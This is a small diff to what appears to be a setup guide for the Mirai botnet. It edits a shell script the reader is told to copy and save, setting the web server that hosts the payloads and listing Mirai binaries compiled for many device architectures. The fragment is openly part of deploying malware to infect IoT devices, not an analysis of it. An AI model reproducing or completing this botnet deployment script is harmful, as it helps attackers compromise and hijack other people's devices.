@@ -102,7 +102,7 @@ When you have finished checking, copy and paste the following code and save it a
 #!/bin/sh
 
 # Edit
-WEBSERVER="IP OR HOSTNAME:80"
+WEBSERVER="localhost:80"
 # Stop editing now 
 
 BINARIES="mirai.arm mirai.m68k miraint.x86 miraint.spc miraint.sh4 miraint.ppc miraint.mpsl miraint.mips miraint.arm7 miraint.arm5n miraint.arm"
